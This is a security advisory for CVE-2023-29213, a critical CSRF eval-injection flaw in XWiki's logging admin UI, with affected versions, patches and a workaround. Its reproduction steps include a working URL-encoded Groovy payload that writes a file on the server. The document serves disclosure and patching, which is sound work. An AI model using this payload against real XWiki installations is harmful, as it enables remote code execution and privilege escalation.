# org.xwiki.platform:xwiki-platform-logging-ui Eval Injection vulnerability

**GHSA**: GHSA-4655-wh7v-3vmg | **CVE**: CVE-2023-29213 | **Severity**: critical (CVSS 9.1)

**CWE**: CWE-74, CWE-95, CWE-352

**Affected Packages**:
- **org.xwiki.platform:xwiki-platform-logging-ui** (maven): >= 4.2-milestone-3, < 13.10.11
- **org.xwiki.platform:xwiki-platform-logging-ui** (maven): >= 14.0-rc-1, < 14.4.7
- **org.xwiki.platform:xwiki-platform-logging-ui** (maven): >= 14.5, < 14.10

## Description

### Impact


#### Steps to reproduce:

It is possible to trick a user with programming rights into visiting <xwiki-host>/xwiki/bin/view/XWiki/LoggingAdmin?loggeraction_set=1&logger_name=%7B%7Bcache%7D%7D%7B%7Bgroovy%7D%7Dnew+File%28%22%2Ftmp%2Fexploit.txt%22%29.withWriter+%7B+out+-%3E+out.println%28%22created+from+notification+filter+preferences%21%22%29%3B+%7D%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fcache%7D%7D&logger_level=TRACE where <xwiki-host> is the URL of your XWiki installation, e.g., by embedding an image with this URL in a document that is viewed by a user with programming rights.

#### Expected result:

No file in /tmp/exploit.txt has been created.

#### Actual result:

The file `/tmp/exploit.txt` is been created with content "created from notification filter preferences!". This demonstrates a CSRF remote code execution vulnerability that could also be used for privilege escalation or data leaks (if the XWiki installation can reach remote hosts).


### Patches
The problem has been patched on XWiki 14.4.7, and 14.10.

### Workarounds
The issue can be fixed manually applying this [patch](https://github.com/xwiki/xwiki-platform/commit/49fdfd633ddfa346c522d2fe71754dc72c9496ca).

### References
- https://jira.xwiki.org/browse/XWIKI-20291
- https://github.com/xwiki/xwiki-platform/commit/49fdfd633ddfa346c522d2fe71754dc72c9496ca

### For more information
If you have any questions or comments about this advisory:

*    Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)
*    Email us at [Security Mailing List](mailto:security@xwiki.org)

